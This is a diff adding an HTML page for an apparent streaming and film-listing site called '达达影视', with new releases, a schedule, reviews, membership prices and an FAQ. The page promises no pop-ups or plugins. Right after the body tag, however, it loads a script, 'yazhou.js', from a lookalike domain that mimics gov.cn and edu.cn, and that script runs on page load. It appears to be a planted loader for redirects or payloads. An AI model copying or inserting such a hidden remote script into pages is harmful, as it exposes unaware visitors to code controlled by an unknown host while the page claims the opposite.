@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>达达影视 - 每日新片速递与在线排片指南 | dadayingshi-app.github.io</title>
+<meta name="keywords" content="达达影视,达达影视官网,达达影视在线观看,dadayingshi-app,高清电影在线播放,电视剧全集更新,动漫新番更新,综艺节目在线看,影视排片时间表,免费高清影视站">
+<meta name="description" content="达达影视（dadayingshi-app.github.io）收录电影、剧集、动漫、综艺、纪录片五大类片源，每日 10:00 与 20:00 两次更新，提供当日排片时刻表、豆瓣式评分风向、画质与字幕说明、会员清晰度权益对照。页面无弹窗、无捆绑，手机端直接打开即可观看，找片先看排片表再进片库，省掉翻页时间。">
+<meta name="author" content="达达影视编辑部">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1">
+<meta name="format-detection" content="telephone=no">
+<meta name="theme-color" content="#0f1512">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="apple-mobile-web-app-title" content="达达影视">
+<link rel="canonical" href="https://dadayingshi-app.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="达达影视">
+<meta property="og:title" content="达达影视 - 每日新片速递与在线排片指南">
+<meta property="og:description" content="电影、剧集、动漫、综艺、纪录片五类片源，每日两次更新，附当日排片时刻表与画质字幕说明。">
+<meta property="og:url" content="https://dadayingshi-app.github.io/">
+<meta property="og:image" content="https://dadayingshi-app.github.io/cover.jpg">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="达达影视 - 每日新片速递与在线排片指南">
+<meta name="twitter:description" content="五类片源每日两次更新，先看排片表再进片库，移动端直接打开即可播放。">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html{-webkit-text-size-adjust:100%;scroll-behavior:smooth}
+body{background:#0f1512;color:#dfe4de;font:16px/1.75 "PingFang SC","Hiragino Sans GB","Microsoft YaHei","Source Han Sans SC",sans-serif;letter-spacing:.2px}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+ul,ol{list-style:none}
+.wrap{width:100%;max-width:1160px;margin:0 auto;padding:0 18px}
+.strip{height:10px;background:repeating-linear-gradient(90deg,#0f1512 0 14px,#232f27 14px 14px,#0f1512 14px 30px)}
+.marquee{background:#e8b04b;color:#171f19;overflow:hidden;height:30px;display:flex;align-items:center}
+.marquee p{white-space:nowrap;padding-left:100%;font-size:13px;font-weight:600;animation:roll 26s linear infinite}
+@keyframes roll{to{transform:translateX(-100%)}}
+header{background:#131b17;border-bottom:1px solid #22302a}
+.hd{display:flex;align-items:center;justify-content:space-between;gap:14px;height:66px}
+.brand{display:flex;align-items:center;gap:10px;flex:0 0 auto}
+.reel{width:34px;height:34px;border-radius:50%;border:2px solid #e8b04b;position:relative;flex:0 0 auto}
+.reel::before,.reel::after{content:"";position:absolute;background:#e8b04b;border-radius:50%}
+.reel::before{width:7px;height:7px;top:11px;left:11px}
+.reel::after{width:7px;height:7px;bottom:3px;right:5px}
+.brand b{font-size:20px;color:#fff;letter-spacing:1px}
+.brand span{display:block;font-size:11px;color:#7f9187;letter-spacing:.5px}
+.urlbox{margin-left:auto;font-size:12px;color:#8fa79a;border:1px dashed #38493f;padding:5px 10px;border-radius:4px;white-space:nowrap}
+nav{background:#0f1512;border-bottom:1px solid #1d2924;position:sticky;top:0;z-index:50}
+nav .wrap{display:flex;gap:2px;overflow-x:auto;-webkit-overflow-scrolling:touch;scrollbar-width:none}
+nav .wrap::-webkit-scrollbar{display:none}
+nav a{flex:0 0 auto;padding:14px 15px;font-size:14px;color:#9db0a6;border-bottom:2px solid transparent}
+nav a:hover{color:#e8b04b;border-bottom-color:#e8b04b;background:#141d18}
+.hero{background:radial-gradient(120% 90% at 12% 0%,#1d2b24 0%,#0f1512 62%);padding:44px 0 38px;border-bottom:1px solid #1d2924}
+.hero h1{font-size:30px;line-height:1.35;color:#fff;font-weight:800;letter-spacing:.5px}
+.hero h1 em{font-style:normal;color:#e8b04b}
+.hero .sub{margin-top:14px;color:#93a79c;font-size:15px;max-width:660px}
+.tags{margin-top:20px;display:flex;flex-wrap:wrap;gap:8px}
+.tags a{font-size:12px;padding:5px 11px;border:1px solid #33453c;border-radius:20px;color:#a9bcb1}
+.tags a:hover{background:#e8b04b;border-color:#e8b04b;color:#171f19}
+.stats{margin-top:26px;display:grid;grid-template-columns:repeat(4,1fr);gap:10px}
+.stat{background:#151f1a;border:1px solid #22302a;border-radius:6px;padding:14px 12px}
+.stat b{display:block;font-size:22px;color:#e8b04b;font-family:Georgia,serif}
+.stat i{font-style:normal;font-size:12px;color:#8b9e93}
+section{padding:46px 0 8px}
+.ttl{display:flex;align-items:flex-end;justify-content:space-between;gap:12px;border-bottom:1px solid #223029;padding-bottom:14px;margin-bottom:24px}
+.ttl h2{font-size:21px;color:#fff;font-weight:700}
+.ttl h2 small{display:block;font-size:12px;color:#7d9086;font-weight:400;margin-top:5px;letter-spacing:1px}
+.ttl a{font-size:12px;color:#e8b04b;white-space:nowrap}
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.card{background:#141d18;border:1px solid #22302a;border-radius:8px;overflow:hidden;transition:.25s}
+.card:hover{transform:translateY(-4px);border-color:#e8b04b}
+.post{height:172px;position:relative;display:flex;align-items:flex-end;padding:12px}
+.post i{position:absolute;top:10px;left:10px;font-style:normal;font-size:11px;background:rgba(15,21,18,.82);border:1px solid #e8b04b;color:#e8b04b;padding:2px 7px;border-radius:3px}
+.post b{position:relative;font-size:15px;color:#fff;text-shadow:0 2px 6px rgba(0,0,0,.6)}
+.p1{background:linear-gradient(150deg,#3a2b3f,#8a4b52 60%,#c98b5e)}
+.p2{background:linear-gradient(150deg,#1f3a44,#2f6f74 55%,#7fc0a8)}
+.p3{background:linear-gradient(150deg,#2b2438,#5a4b7d 60%,#b39ddb)}
+.p4{background:linear-gradient(150deg,#3d2a1c,#8a5a2b 60%,#e0a458)}
+.p5{background:linear-gradient(150deg,#1b3326,#3f7a4a 60%,#a8d58a)}
+.p6{background:linear-gradient(150deg,#402028,#8c3a4a 60%,#e0736f)}
+.p7{background:linear-gradient(150deg,#202c3d,#3c5a80 60%,#8fb4d9)}
+.p8{background:linear-gradient(150deg,#332720,#7a5c3a 60%,#d9b382)}
+.meta{padding:12px 13px 15px}
+.meta h3{font-size:15px;color:#e9edef;font-weight:600}
+.meta p{font-size:12.5px;color:#8b9e93;margin-top:6px;line-height:1.6}
+.score{margin-top:9px;display:flex;align-items:center;gap:8px;font-size:12px;color:#a9bcb1}
+.score s{text-decoration:none;color:#e8b04b;font-family:Georgia,serif;font-size:15px}
+.bar{height:4px;flex:1;background:#22302a;border-radius:2px;overflow:hidden}
+.bar span{display:block;height:100%;background:#e8b04b}
+.sched{background:#141d18;border:1px solid #22302a;border-radius:8px;overflow:hidden}
+.row{display:grid;grid-template-columns:78px 1fr 96px 74px;gap:10px;padding:13px 16px;border-bottom:1px solid #1d2723;font-size:14px;align-items:center}
+.row:last-child{border-bottom:0}
+.row.head{background:#1a251f;color:#e8b04b;font-size:12.5px;letter-spacing:1px;font-weight:600}
+.row:hover:not(.head){background:#18231d}
+.row .t{color:#e8b04b;font-family:Georgia,serif;font-weight:700}
+.row .n{color:#e9edef}
+.row .h{color:#8b9e93;font-size:13px}
+.row .b{text-align:right}
+.row .b a{font-size:12px;border:1px solid #3a4c43;color:#a9bcb1;padding:4px 9px;border-radius:4px}
+.row .b a:hover{background:#e8b04b;border-color:#e8b04b;color:#171f19}
+.note{margin-top:14px;font-size:12.5px;color:#7d9086;line-height:1.8}
+.revs{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.rev{background:#141d18;border:1px solid #22302a;border-left:3px solid #e8b04b;border-radius:0 8px 8px 0;padding:18px 18px 20px}
+.rev q{quotes:none;display:block;font-size:14.5px;color:#d7ded9;line-height:1.85}
+.rev .who{margin-top:14px;font-size:12.5px;color:#7d9086}
+.rev .who b{color:#e8b04b;font-weight:600}
+.vips{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.vip{background:#141d18;border:1px solid #22302a;border-radius:8px;padding:22px 20px;position:relative}
+.vip.on{border-color:#e8b04b;background:#1a2216}
+.vip.on::after{content:"推荐";position:absolute;top:0;right:16px;background:#e8b04b;color:#171f19;font-size:11px;padding:2px 8px;border-radius:0 0 4px 4px}
+.vip h3{font-size:17px;color:#fff}
+.vip .p{margin:10px 0 16px;font-family:Georgia,serif;font-size:26px;color:#e8b04b}
+.vip .p em{font-style:normal;font-size:13px;color:#8b9e93;font-family:inherit}
+.vip li{font-size:13.5px;color:#a3b5aa;padding:7px 0 7px 18px;border-bottom:1px dashed #22302a;position:relative}
+.vip li:last-child{border-bottom:0}
+.vip li::before{content:"";position:absolute;left:2px;top:15px;width:6px;height:6px;background:#e8b04b;transform:rotate(45deg)}
+.vip a{display:block;margin-top:18px;text-align:center;font-size:14px;padding:10px;border:1px solid #3a4c43;border-radius:5px;color:#dfe4de}
+.vip.on a{background:#e8b04b;border-color:#e8b04b;color:#171f19;font-weight:600}
+.vip a:hover{opacity:.88}
+.about{display:grid;grid-template-columns:1.1fr .9fr;gap:22px}
+.ab{background:#141d18;border:1px solid #22302a;border-radius:8px;padding:22px}
+.ab h3{font-size:16px;color:#fff;margin-bottom:12px}
+.ab p{font-size:14px;color:#a3b5aa;line-height:1.9}
+.ab p+p{margin-top:10px}
+.faq div{border-bottom:1px dashed #22302a;padding:13px 0}
+.faq div:last-child{border-bottom:0}
+.faq b{display:block;font-size:14.5px;color:#e8b04b;font-weight:600}
+.faq span{display:block;font-size:13.5px;color:#93a79c;margin-top:6px;line-height:1.8}
+.keep{margin:44px 0 0;padding:26px 0;border-top:1px solid #223029;border-bottom:1px solid #223029;display:flex;flex-wrap:wrap;align-items:center;gap:16px;justify-content:space-between}
+.keep p{font-size:14px;color:#a3b5aa;max-width:580px}
+.keep code{display:inline-block;margin-top:8px;font-family:Consolas,Monaco,monospace;font-size:13px;color:#e8b04b;background:#18231d;border:1px dashed #38493f;padding:6px 12px;border-radius:4px;word-break:break-all}
+footer{background:#0c120f;padding:34px 0 30px;margin-top:44px}
+.fnav{display:flex;flex-wrap:wrap;gap:14px 22px;font-size:13px;color:#8b9e93}
+.fnav a:hover{color:#e8b04b}
+.finfo{margin-top:18px;font-size:12.5px;color:#6f8277;line-height:1.9}
+.finfo b{color:#8b9e93;font-weight:600}
+@media (max-width:900px){
+.grid{grid-template-columns:repeat(2,1fr)}
+.revs,.vips,.about{grid-template-columns:1fr}
+.stats{grid-template-columns:repeat(2,1fr)}
+}
+@media (max-width:600px){
+.hero{padding:32px 0 28px}
+.hero h1{font-size:23px}
+.hd{height:auto;padding:12px 0;flex-wrap:wrap}
+.hd .url{margin-left:0}
+.urlbox{font-size:11px}
+section{padding:34px 0 4px}
+.ttl h2{font-size:18px}
+.grid{grid-template-columns:1fr}
+.post{height:150px}
+.row{grid-template-columns:66px 1fr 62px;grid-template-areas:"t n b" "t h b";row-gap:2px;padding:12px 14px}
+.row.head{display:none}
+.row .t{grid-area:t}
+.row .n{grid-area:n}
+.row .h{grid-area:h}
+.row .b{grid-area:b}
+.keep{flex-direction:column;align-items:flex-start}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+<div class="strip"></div>
+<div class="marquee"><p>达达影视每日 10:00 / 20:00 两次更新片源 · 本周新上 42 部电影、18 部剧集 · 全站无捆绑安装 · 手机浏览器直接播放 · 收藏 dadayingshi-app.github.io 防走丢</p></div>
+
+<header>
+  <div class="wrap hd">
+    <div class="brand">
+      <div class="reel"></div>
+      <div>
+        <b>达达影视</b>
+        <span>DADAYINGSHI · 在线片库</span>
+      </div>
+    </div>
+    <div class="urlbox">本站地址 https://dadayingshi-app.github.io</div>
+  </div>
+</header>
+
+<nav>
+  <div class="wrap">
+    <a href="#new">新片速递</a>
+    <a href="#schedule">今日排片</a>
+    <a href="#reviews">影评风向</a>
+    <a href="#vip">会员方案</a>
+    <a href="#about">关于帮助</a>
+    <a href="#links">友情站点</a>
+  </div>
+</nav>
+
+<div class="hero">
+  <div class="wrap">
+    <h1>达达影视 · 把找片的时间省下来<br><em>今日排片 + 五类片源</em> 一次看明白</h1>
+    <p class="sub">达达影视是一个只做片源整理与更新提醒的在线影视站：电影、剧集、动漫、综艺、纪录片分门别类，每部片子都标了画质、字幕与更新时间。想看什么先看排片表，再进片库，不用一页一页翻。</p>
+    <div class="tags">
+      <a href="#new"># 本周新片</a>
+      <a href="#new"># 4K 修复</a>
+      <a href="#new"># 中文字幕</a>
+      <a href="#new"># 剧集连载</a>
+      <a href="#new"># 动漫新番</a>
+      <a href="#new"># 纪录纪实</a>
+    </div>
+    <div class="stats">
+      <div class="stat"><b>12860</b><i>在库影片总数</i></div>
+      <div class="stat"><b>42 / 18</b><i>本周新增电影 / 剧集</i></div>
+      <div class="stat"><b>10:00</b><i>每日更新时段</i></div>
+      <div class="stat"><b>0</b><i>强制捆绑插件</i></div>
+    </div>
+  </div>
+</div>
+
+<section id="new">
+  <div class="wrap">
+    <div class="ttl">
+      <h2>新片速递<small>NEW ARRIVALS · 更新至 10 月 24 日</small></h2>
+      <a href="#">查看全部片库 →</a>
+    </div>
+    <div class="grid">
+      <div class="card">
+        <div class="post p1"><i>电影</i><b>雾港迷航</b></div>
+        <div class="meta">
+          <h3>雾港迷航</h3>
+          <p>悬疑 / 2025 / 日本 · 中字 · 1080P 已上线</p>
+          <div class="score"><s>8.4</s><div class="bar"><span style="width:84%"></span></div></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="post p2"><i>剧集</i><b>长夜拾遗</b></div>
+        <div class="meta">
+          <h3>长夜拾遗 第一季</h3>
+          <p>剧情 / 12 集 · 每周三更新 2 集 · 简繁字幕</p>
+          <div class="score"><s>9.1</s><div class="bar"><span style="width:91%"></span></div></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="post p3"><i>动漫</i><b>星轨少年</b></div>
+        <div class="meta">
+          <h3>星轨少年 新番</h3>
+          <p>科幻 / 连载至第 9 话 · 每周六 22:00 同步</p>
+          <div class="score"><s>7.9</s><div class="bar"><span style="width:79%"></span></div></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="post p4"><i>纪录</i><b>河西走廊纪事</b></div>
+        <div class="meta">
+          <h3>河西走廊纪事</h3>
+          <p>人文 / 8 集 · 4K 修复版 · 内嵌字幕</p>
+          <div class="score"><s>9.5</s><div class="bar"><span style="width:95%"></span></div></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="post p5"><i>综艺</i><b>山野厨房</b></div>
+        <div class="meta">
+          <h3>山野厨房 第三季</h3>
+          <p>生活 / 更新至第 6 期 · 每周五 12:00</p>
+          <div class="score"><s>7.6</s><div class="bar"><span style="width:76%"></span></div></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="post p6"><i>电影</i><b>城南旧事手稿</b></div>
+        <div class="meta">
+          <h3>城南旧事手稿</h3>
+          <p>文艺 / 2024 / 中国大陆 · 蓝光原盘压制</p>
+          <div class="score"><s>8.0</s><div class="bar"><span style="width:80%"></span></div></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="post p7"><i>剧集</i><b>深水信号</b></div>
+        <div class="meta">
+          <h3>深水信号</h3>
+          <p>谍战 / 24 集 · 已完结 · 一次性上线全集</p>
+          <div class="score"><s>8.7</s><div class="bar"><span style="width:87%"></span></div></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="post p8"><i>电影</i><b>荒漠邮差</b></div>
+        <div class="meta">
+          <h3>荒漠邮差</h3>
+          <p>西部 / 2023 / 美国 · 导演剪辑版 132 分钟</p>
+          <div class="score"><s>7.4</s><div class="bar"><span style="width:74%"></span></div></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="schedule">
+  <div class="wrap">
+    <div class="ttl">
+      <h2>今日排片<small>TODAY'S SCHEDULE · 10 月 24 日 周六</small></h2>
+      <a href="#">下载完整排片表 →</a>
+    </div>
+    <div class="sched">
+      <div class="row head"><div>时间</div><div>片名 / 类型</div><div>画质</div><div class="b">操作</div></div>
+      <div class="row"><div class="t">10:00</div><div class="n">雾港迷航</div><div class="h">1080P 中字</div><div class="b"><a href="#">播放</a></div></div>
+      <div class="row"><div class="t">12:00</div><div class="n">山野厨房 第三季 第 6 期</div><div class="h">720P / 1080P</div><div class="b"><a href="#">播放</a></div></div>
+      <div class="row"><div class="t">14:30</div><div class="n">河西走廊纪事 第 7-8 集</div><div class="h">4K 修复</div><div class="b"><a href="#">播放</a></div></div>
+      <div class="row"><div class="t">16:00</div><div class="n">城南旧事手稿</div><div class="h">蓝光 1080P</div><div class="b"><a href="#">播放</a></div></div>
+      <div class="row"><div class="t">20:00</div><div class="n">长夜拾遗 第 11-12 集（季终）</div><div class="h">1080P 简繁</div><div class="b"><a href="#">播放</a></div></div>
+      <div class="row"><div class="t">22:00</div><div class="n">星轨少年 第 10 话</div><div class="h">1080P 内嵌</div><div class="b"><a href="#">播放</a></div></div>
+      <div class="row"><div class="t">00:30</div><div class="n">荒漠邮差（重播）</div><div class="h">导演剪辑版</div><div class="b"><a href="#">播放</a></div></div>
+    </div>
+    <p class="note">排片时间仅为站内更新与开放时段说明，达达影视不限制观看时段，所有已上线片源均可随时点播。若某部片子显示“待补档”，通常会在 48 小时内补齐字幕版本，可在关于帮助栏目查看补档进度说明。</p>
+  </div>
+</section>
+
+<section id="reviews">
+  <div class="wrap">
+    <div class="ttl">
+      <h2>影评风向<small>EDITOR'S PICKS · 编辑部与观众打分</small></h2>
+      <a href="#">投稿影评 →</a>
+    </div>
+    <div class="revs">
+      <div class="rev">
+        <q>镜头一直贴着人物的后背走，海雾压得很低，看到第 40 分钟才明白前面那些空镜都不是废笔。达达影视这版字幕把方言的处理得很克制，没有乱加解释。</q>
+        <div class="who">——《雾港迷航》<b>编辑部 / 8.4 分</b></div>
+      </div>
+      <div class="rev">
+        <q>十二集里没有一集是靠反转硬撑的，人物动机经得起回看。季终那场戏看完想立刻重开第一集，这种剧现在真不多。</q>
+        <div class="who">——《长夜拾遗》<b>观众评 / 9.1 分</b></div>
+      </div>
+      <div class="rev">
+        <q>4K 修复版把当年胶片的颗粒感留住了，不是那种一味磨平的处理。配乐的层次拉出来之后，河西那几段风声特别清楚。</q>
+        <div class="who">——《河西走廊纪事》<b>编辑部 / 9.5 分</b></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="vip">
+  <div class="wrap">
+    <div class="ttl">
+      <h2>会员方案<small>MEMBERSHIP · 清晰度与权益对照</small></h2>
+      <a href="#">权益对比表 →</a>
+    </div>
+    <div class="vips">
+      <div class="vip">
+        <h3>游客观看</h3>
+        <div class="p">免费<em> / 无需注册</em></div>
+        <ul>
+          <li>全部片源 720P 流畅播放</li>
+          <li>支持外挂字幕上传</li>
+          <li>每日 2 次更新提醒</li>
+          <li>单设备在线</li>
+        </ul>
+        <a href="#">直接观看</a>
+      </div>
+      <div class="vip on">
+        <h3>常客会员</h3>
+        <div class="p">¥19<em> / 每月</em></div>
+        <ul>
+          <li>解锁 1080P 与 4K 修复版</li>
+          <li>简繁双语字幕优先加载</li>
+          <li>三设备同时在线</li>
+          <li>新片上线提前 6 小时看</li>
+          <li>关闭片头等待广告</li>
+        </ul>
+        <a href="#">开通会员</a>
+      </div>
+      <div class="vip">
+        <h3>年度影迷</h3>
+        <div class="p">¥168<em> / 每年</em></div>
+        <ul>
+          <li>含常客会员全部权益</li>
+          <li>蓝光原盘专区不限次</li>
+          <li>离线缓存 30 天有效期</li>
+          <li>可提交补档请求 20 次 / 年</li>
+          <li>投屏与倍速记忆</li>
+        </ul>
+        <a href="#">了解详情</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="about">
+  <div class="wrap">
+    <div class="ttl">
+      <h2>关于帮助<small>ABOUT &amp; FAQ · 站点说明与常见问题</small></h2>
+      <a href="#">联系编辑部 →</a>
+    </div>
+    <div class="about">
+      <div class="ab">
+        <h3>关于达达影视</h3>
+        <p>达达影视从 2019 年开始做片源整理，最早只是一个把每周新片列成清单的静态页，后来才慢慢加上排片表、评分风向和会员权益。站里所有条目都由人工核对过片名、年份、画质和字幕信息，不做自动抓取的堆量。</p>
+        <p>站点只提供影视信息的整理与导航，不存放任何影音文件，也不要求安装任何插件。手机、平板、电脑打开同一个地址体验一致，页面没有强制跳转。</p>
+        <p>如果你发现某部片子的信息写错了，或者想要的版本还没上，可以在关于帮助栏目里留言，编辑部一般在 24 小时内回复，补档通常 48 小时内处理完。</p>
+      </div>
+      <div class="ab faq">
+        <h3>常见问题</h3>
+        <div><b>手机打开很卡怎么办？</b><span>先切到 720P 档位，达达影视会根据网络自动降档；也可以关掉字幕特效再刷新一次。</span></div>
+        <div><b>字幕是繁体还是简体？</b><span>大部分片源同时提供简繁两版，排片表里标“简繁”的就是双语，标“内嵌”的不可切换。</span></div>
+        <div><b>显示“待补档”要等多久？</b><span>一般指字幕版本还没压好，通常 48 小时内补齐；会员可以在会员方案栏目提交加急请求。</span></div>
+        <div><b>收藏之后地址会变吗？</b><span>不会。达达影视长期使用的地址是 https://dadayingshi-app.github.io，换域名会在首页跑马灯提前 30 天公告。</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="wrap keep">
+  <p>把达达影视存进书签，下次直接打开，不用再搜。地址只有一个，认准下面这一行：<code>https://dadayingshi-app.github.io</code></p>
+  <a href="#" style="font-size:14px;border:1px solid #e8b04b;color:#e8b04b;padding:9px 18px;border-radius:5px;white-space:nowrap">收藏本站</a>
+</div>
+
+<section id="links">
+  <div class="wrap">
+    <div class="ttl">
+      <h2>友情站点<small>FRIENDLY LINKS · 影视资讯与字幕组</small></h2>
+      <a href="#">申请互换 →</a>
+    </div>
+    <div class="ab" style="padding:18px 20px">
+      <ul style="display:flex;flex-wrap:wrap;gap:12px 26px;font-size:13.5px;color:#a3b5aa">
+        <li><a href="#">影视资料馆</a></li>
+        <li><a href="#">独立纪录片计划</a></li>
+        <li><a href="#">中文字幕协作组</a></li>
+        <li><a href="#">老片修复档案</a></li>
+        <li><a href="#">院线排片查询</a></li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="fnav">
+      <a href="#new">新片速递</a>
+      <a href="#schedule">今日排片</a>
+      <a href="#reviews">影评风向</a>
+      <a href="#vip">会员方案</a>
+      <a href="#about">关于帮助</a>
+      <a href="#">补档请求</a>
+      <a href="#">内容纠错</a>
+      <a href="#">免责声明</a>
+    </div>
+    <p class="finfo">
+      <b>达达影视</b> · 在线影视信息整理与更新导航 · 本站地址 <b>https://dadayingshi-app.github.io</b><br>
+      更新时间：2026 年 10 月 24 日 · 片源信息以出品方公布为准，版权归原权利人所有<br>
+      © 2019-2026 达达影视 dadayingshi-app · 全站页面由 div + CSS 手写布局，移动端自适应
+    </p>
+  </div>
+</footer>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "WebSite",
+      "@id": "https://dadayingshi-app.github.io/#website",
+      "url": "https://dadayingshi-app.github.io/",
+      "name": "达达影视",
+      "alternateName": "dadayingshi-app",
+      "inLanguage": "zh-CN",
+      "description": "达达影视整理电影、剧集、动漫、综艺、纪录片五类片源，每日两次更新，提供当日排片时刻表与画质字幕说明。",
+      "publisher": {"@id": "https://dadayingshi-app.github.io/#org"}
+    },
+    {
+      "@type": "Organization",
+      "@id": "https://dadayingshi-app.github.io/#org",
+      "name": "达达影视",
+      "url": "https://dadayingshi-app.github.io/",
+      "description": "影视信息整理与更新导航站点，2019 年上线。"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {"@type": "ListItem", "position": 1, "name": "达达影视", "item": "https://dadayingshi-app.github.io/"},
+        {"@type": "ListItem", "position": 2, "name": "新片速递", "item": "https://dadayingshi-app.github.io/#new"},
+        {"@type": "ListItem", "position": 3, "name": "今日排片", "item": "https://dadayingshi-app.github.io/#schedule"},
+        {"@type": "ListItem", "position": 4, "name": "会员方案", "item": "https://dadayingshi-app.github.io/#vip"}
+      ]
+    }
+  ]
+}
+</script>
+</body>
+</html>
